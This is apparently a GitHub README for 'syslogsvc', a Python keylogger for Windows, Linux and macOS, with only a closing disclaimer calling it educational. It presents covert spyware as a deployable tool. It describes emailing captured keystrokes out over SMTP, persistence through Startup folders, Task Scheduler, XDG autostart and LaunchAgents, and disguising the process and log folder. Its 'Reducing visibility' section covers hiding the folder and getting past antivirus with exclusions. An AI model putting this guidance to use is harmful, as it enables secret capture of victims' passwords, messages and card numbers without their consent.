# syslogsvc

A small, dependency-light keystroke and foreground-window logger for Windows, Linux (X11), and macOS. It writes plain-text, per-day logs to a dot-directory that mimics a system service, and can optionally mail each flushed chunk out over SMTP so you get the log off-box without opening a port.

Runs in the background, has no GUI, and needs no admin rights.

## Features

- **Keystroke capture** via `pynput` — printable characters, plus readable tags for control keys, function keys, arrows, and modifier state (`[TAB]`, `[BKSP]`, `[CTRL-C]`, `[F5]`, …).
- **Active window context** — every foreground window change is stamped into the log with a timestamp, so keystrokes are attributable to an application.
- **Per-day log files** with automatic midnight rollover.
- **Optional SMTP exfil** — each flush is emailed as its own message, subject line tagged with hostname and time.
- **No console window** when launched with `pythonw` or built with `--noconsole`.
- **Low-footprint** — single file, pure stdlib + one dependency, no service registration, no registry writes, no open ports.
- **Cross-platform** — Windows, Linux, macOS from the same source.
- **Graceful stop** on `Ctrl+C` or the global hotkey `Ctrl+Alt+Q`, with a final buffer flush.

## How it works

Three threads share one `Logger` instance:

| Thread | Role |
| --- | --- |
| `keyboard.Listener` | Captures key events, appends tags/characters to an in-memory buffer. |
| `window_loop` | Polls the foreground window every `POLL_WINDOW` seconds; on change, pushes a separator line into the buffer. |
| `flush_loop` | Every `FLUSH_EVERY` seconds, drains the buffer to disk and hands the chunk to a short-lived SMTP thread. |

Nothing is written per keystroke, which keeps disk I/O low and makes the on-disk pattern look like periodic app logging rather than continuous writes.

## Requirements

- Python 3.8+
- `pynput` (`pip install pynput`)
- **Linux only:** an X11 session and `xdotool` on `PATH` (Wayland is not supported — `pynput` and `xdotool` are both X11-bound)
- **macOS only:** grant the host terminal/binary Accessibility permission under *System Settings → Privacy & Security → Accessibility*, otherwise the listener captures nothing
- **Windows:** nothing extra; no elevation needed

```
pip install pynput
```

## Installation

```bash
git clone https://github.com/Mohitgingale/Cybersec-Projects.git
cd Cybersec-Projects/KEYLOGGER
pip install -r requirements.txt
python keylog.py
```

## Configuration

Edit the constants block at the top of `keylog.py`.

| Constant | Default | Meaning |
| --- | --- | --- |
| `SEND_EMAIL` | `True` | Master switch for SMTP exfil. `False` = local logs only. |
| `SMTP_HOST` | `smtp.gmail.com` | SMTP server. |
| `SMTP_PORT` | `587` | STARTTLS port. |
| `SMTP_USER` | `YourMail@gmail.com` | Authenticating account, also used as `From`. |
| `SMTP_PASS` | *(app password)* | Gmail requires an **App Password**, not the account password. |
| `MAIL_TO` | `ReceiverMail@gmail.com` | Destination address. |
| `FLUSH_EVERY` | `15` | Seconds between buffer flushes. |
| `POLL_WINDOW` | `0.75` | Seconds between foreground-window checks. |

### Gmail App Password

1. Enable 2-Step Verification on the Google account.
2. Go to *Google Account → Security → App passwords*.
3. Generate one for "Mail", paste the 16-character value into `SMTP_PASS`. The spaces Google displays are accepted verbatim.
4. Use a dedicated Google account, not your primary one.

### Tuning

- `FLUSH_EVERY = 15` with email on means **four messages per minute**. Raise it to `120`–`300` for a mailbox you actually want to read.
- Lowering `POLL_WINDOW` increases context granularity at the cost of CPU.
- Turning `SEND_EMAIL` off removes all network activity.

## Usage

```bash
# Windows, no console window
pythonw keylog.py

# Linux / macOS
python keylog.py
```

Stop with `Ctrl+C` in the terminal or `Ctrl+Alt+Q` from anywhere.

## Log location

| Platform | Path |
| --- | --- |
| Windows | `%LOCALAPPDATA%\.syslogsvc\log_YYYY-MM-DD.txt` |
| Linux / macOS | `~/.syslogsvc/log_YYYY-MM-DD.txt` |

On Windows the directory is *not* marked hidden by default — run `attrib +h "%LOCALAPPDATA%\.syslogsvc"` once if you want it out of casual sight.

## Sample output

```
# session 2026-11-13 09:14:02 DESKTOP-7QK2F1 Windows

===== [2026-11-13 09:14:07] Inbox - you@gmail.com - Gmail - Google Chrome =====
hello there[TAB]this is a test[ENTER]
===== [2026-11-13 09:14:31] notes.txt - Notepad =====
[CTRL-V]
```

## Autostart

**Windows — Startup folder (simplest)**

1. `Win+R` → `shell:startup`
2. Create a shortcut whose target is `pythonw.exe "C:\path\to\keylog.py"`

**Windows — Task Scheduler (more robust)**

Create a task, trigger *At log on*, action *Start a program* → `pythonw.exe` with the script path as argument, and enable *Run whether user is logged on or not* plus *Hidden*.

**Linux — autostart**

`~/.config/autostart/syslogsvc.desktop`:

```ini
[Desktop Entry]
Type=Application
Name=syslogsvc
Exec=python3 /home/user/syslogsvc/keylog.py
X-GNOME-Autostart-enabled=true
```

**macOS — LaunchAgent**

`~/Library/LaunchAgents/com.user.syslogsvc.plist` with `ProgramArguments` pointing at `python3` and the script, then `launchctl load ~/Library/LaunchAgents/com.user.syslogsvc.plist`.

## Building a standalone binary

```bash
pip install pyinstaller
pyinstaller --onefile --noconsole --name syslogsvc keylog.py
```

Output lands in `dist/`. `--noconsole` is the important flag — without it you get a visible terminal on Windows.

Note that PyInstaller binaries are larger and easier to spot in a process list than `pythonw keylog.py`, and a packed binary is more likely to trip heuristic AV than a plain script.

## Reducing visibility

- Launch with `pythonw` / `--noconsole` — no console window, no taskbar entry.
- Rename the script to something boring (`syslogsvc.py`) and keep it in a dot-directory, not in `Downloads`.
- Disable the email and use local logs if outbound SMTP from the host is noisy.
- If AV flags it, it is usually heuristic rather than signature-based — an exclusion for the folder or the interpreter path resolves it.

## Verification

1. Start the logger.
2. Type into two different applications, switching windows between them.
3. Wait one flush interval.
4. Confirm both separator lines and keystrokes appear in today's log file.
5. If email is on, confirm the message arrived.

## Troubleshooting

| Symptom | Cause |
| --- | --- |
| No keystrokes, no error | macOS Accessibility permission missing, or a Wayland session. |
| Window titles empty on Linux | `xdotool` not installed or not on `PATH`. |
| Logs written but no mail | App Password wrong/revoked, 2FA off, or SMTP blocked on port 587 by the network. Failures are swallowed silently by design. |
| No log file at all | `SEND_EMAIL`/paths fine but the listener never started — check for an `ImportError` from `pynput`. |
| Duplicate modifier tags | Expected: `[SHIFT]`, `[CTRL]`, `[ALT]` are pushed on every press, including auto-repeat. |

## Limitations

- Wayland is unsupported.
- Window titles only; no process name, PID, or URL.
- Buffer is memory-only — an unclean kill loses up to `FLUSH_EVERY` seconds of input.
- `SMTP_PASS` is stored in plaintext in the source file.
- No log rotation or size cap; delete old files manually.
- Email volume is high at the default interval.

## Repository layout

```
keylog.py          # the logger
requirements.txt   # pynput
README.md
.gitignore         # *.log, dist/, build/, __pycache__/
LICENSE
```

## License

MIT License — see [`../LICENSE`](../LICENSE).

```
MIT License

Copyright (c) 2026 Mohit Ingale

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

## ⚠️ Disclaimer

This tool is provided for **educational purposes, ethical hacking, and security research**.

- Do not run it on any machine, network, or application you do not own or have explicit written permission to test.
- On an **employer-owned or client-owned machine**, disclose the logger or confirm it against the organisation's monitoring policy. A keylogger on a work laptop can capture credentials, private messages, and personal data.
- The logs are **plaintext and unencrypted**. Anything typed while it runs — passwords, card numbers, tokens, message contents — lands on disk in the clear and, if `SEND_EMAIL` is enabled, transits a third-party mail provider. Treat the log directory and the receiving mailbox as sensitive.
- **SMTP credentials live in the source file in plaintext.** Anyone with read access to the repo or the script has your app password. Rotate it if the repo is public.
- Background capture is best-effort: Wayland sessions, missing macOS Accessibility permission, or an unclean process kill will silently produce partial or empty logs. Do not rely on it as an audit trail.
- The author is not responsible for any misuse, damage, data loss, or legal consequences arising from use of this tool.
- Provided **as-is, without warranty of any kind**, express or implied, including but not limited to fitness for a particular purpose.
- By using any part of this code, you agree to take full responsibility for your actions.

---

## © Copyright

© 2026 **Mohit Ingale**. All rights reserved.

Part of the [Cybersec-Projects](https://github.com/Mohitgingale/Cybersec-Projects) portfolio. If you fork, patch, or redistribute this tool, keep this notice and the MIT attribution intact.